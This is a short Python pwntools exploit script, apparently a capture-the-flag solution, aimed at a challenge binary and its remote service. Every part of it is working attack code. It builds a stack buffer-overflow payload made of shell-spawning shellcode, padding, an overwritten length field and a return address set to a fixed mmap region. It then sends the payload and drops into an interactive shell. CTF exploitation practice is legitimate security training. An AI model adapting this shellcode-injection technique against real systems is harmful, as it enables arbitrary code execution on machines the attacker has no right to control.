#!/usr/bin/env python3

from pwn import *

exe = ELF("./app_patched")

context.binary = exe

gs = """

b *main+157
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gs)
    else:
        r = remote("0.cloud.chals.io", 25661)

    return r


mmap_addr    = 0x500000
localc_off = 136
ret_off     = 152


shellcode = asm(shellcraft.sh()) 

def main():
    r = conn()

    # good luck pwning :)
    payload = b""
    payload += shellcode
    log.info(f"payload length {len(payload)}")
    payload += b"B" * (127-len(payload)) + b"AAAAAAAAAAAAA"
    payload += p32(7)
    payload += b'C' * 8
    payload += p64(mmap_addr)
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
